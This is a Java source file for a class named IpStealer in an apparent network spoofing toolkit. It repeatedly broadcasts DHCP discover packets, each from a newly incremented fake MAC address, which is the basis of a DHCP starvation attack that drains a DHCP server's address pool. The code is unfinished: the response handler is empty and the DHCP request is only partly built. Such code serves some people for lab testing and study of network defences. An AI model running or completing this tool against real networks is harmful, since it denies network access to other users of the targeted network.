package org.bitducks.spoofing.services;

import java.net.InetAddress;
import java.net.UnknownHostException;
import java.nio.ByteBuffer;
import java.util.Random;

import jpcap.packet.EthernetPacket;
import jpcap.packet.IPPacket;
import jpcap.packet.Packet;
import jpcap.packet.UDPPacket;

import org.bitducks.spoofing.core.Server;
import org.bitducks.spoofing.core.Service;
import org.bitducks.spoofing.util.Constants;
import org.dhcp4java.DHCPConstants;
import org.dhcp4java.DHCPPacket;
import org.dhcp4java.DHCPResponseFactory;


public class IpStealer extends Service {
	private int macAddr = 0;

	@Override
	public void run() {
		System.out.println("IpStealer started");
		
		this.doDiscover();
		
		UDPPacket packet = null;
		while ((packet = (UDPPacket)this.getNextBlockingPacket()) != Packet.EOF) {
			proceedDHCPResponse(packet);
			this.doDiscover();
		}
		
	}
	
	/**
	 * Change the mac address to an other one
	 * Do a DHCP Discover to get an Ip
	 */
	private void doDiscover() {
		++this.macAddr;
		
		UDPPacket udpDiscover = new UDPPacket(68, 67);
		
		try {
			this.setHeader(udpDiscover,
					InetAddress.getByAddress(Constants.NO_IP),
					InetAddress.getByAddress(Constants.BROADCAST_IP));
		} catch (UnknownHostException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		DHCPPacket discover = new DHCPPacket();
		discover.setOp(DHCPConstants.BOOTREQUEST);
		 
		udpDiscover.data = discover.serialize();
		
		Server.getInstance().sendPacket(udpDiscover);
		
		System.out.println("Dhcp discovery sended");
	}
	
	/**
	 * Set the header of the updPacket
	 * @param packet
	 */
	private void setHeader(UDPPacket packet, InetAddress source, InetAddress destination) {
		
		packet.setIPv4Parameter(0, 
				false, 
				false, 
				false, 
				0, 
				false, 
				false, 
				false, 
				0, 
				(new Random()).nextInt(),	// Identifier
				64, 						// TTL
				IPPacket.IPPROTO_UDP,  		// Protocol
				source, 
				destination);
		
		//create an Ethernet packet (frame)
		EthernetPacket ether = new EthernetPacket();
		//set frame type as IP
		ether.frametype = EthernetPacket.ETHERTYPE_IP;
		//set source and destination MAC addresses
		ByteBuffer buf = ByteBuffer.allocate(6);
		buf.put((byte)0x00);
		buf.put((byte)0x00);
		buf.putInt(this.macAddr);
		
		ether.src_mac = buf.array();
		ether.dst_mac =  Constants.BROADCAST;
		
		//set the datalink frame of the packet p as ether
		packet.datalink = ether;
	}
	
	/**
	 * Proceed the response from the DHCP Server.
	 * DHCP Ack are not supported
	 * @param packet
	 */
	private void proceedDHCPResponse(UDPPacket packet) {
		
	}

}
